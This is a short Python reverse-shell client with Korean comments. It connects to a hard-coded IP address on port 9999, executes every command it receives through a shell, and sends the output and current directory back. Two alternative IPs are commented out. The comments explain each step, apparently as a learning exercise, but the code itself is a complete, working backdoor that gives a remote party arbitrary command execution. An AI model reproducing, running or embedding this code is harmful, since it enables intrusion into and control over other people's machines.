from socket import *
import sys
import os   # 서버에서 수신한 명령을 실행하기 위한 모듈
import subprocess

Socket = socket(AF_INET, SOCK_STREAM)
host = '3.34.190.222'
# host = '15.165.205.151'
# host = '210.182.7.8'
port = 9999

Socket.connect((host, port))


while True:
    try:
        data = Socket.recv(1024) # 서버로부터 명령어를 받음

        if data[:2].decode("utf-8") == 'cd':    # 받은 데이터가 cd 명령어라면
            os.chdir(data[3:].decode("utf-8"))  # os가 특정 디렉터리로의 변경을 수행하게 함

        if len(data) > 0:
            # subprocess.Popens로 서브 프로세스를 열음
            # 명령어를 쉘에 전달하려면 shell=True
            # 명령어에 대한 표준 입력, 출력, 에러 데이터를 파이프를 이용해 서브 프로세스로 보내고 받음
            cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)

            # 서프 프로세스의 명령 결과를 출력하기
            # 명령 프롬프트 창에서 출력 결과나 에러가 있을 때의 결과를 읽음
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"euc-kr")
            # 현재 작업 디렉터리를 알기위한 os.getcwd()
            current_working_directory = os.getcwd() + "> "

            # 서버가 명령어 수행 결과를 알기 위해 결과가 담긴 바이트 단위 데이터를 보냄
            Socket.send(str.encode(output_str + current_working_directory))

            print(output_str)

    except error as msg:
        Socket.send(str.encode(str(cmd.stderr.read(),"euc-kr") + current_working_directory))
        print(str.encode(str(cmd.stderr.read(),"euc-kr")))
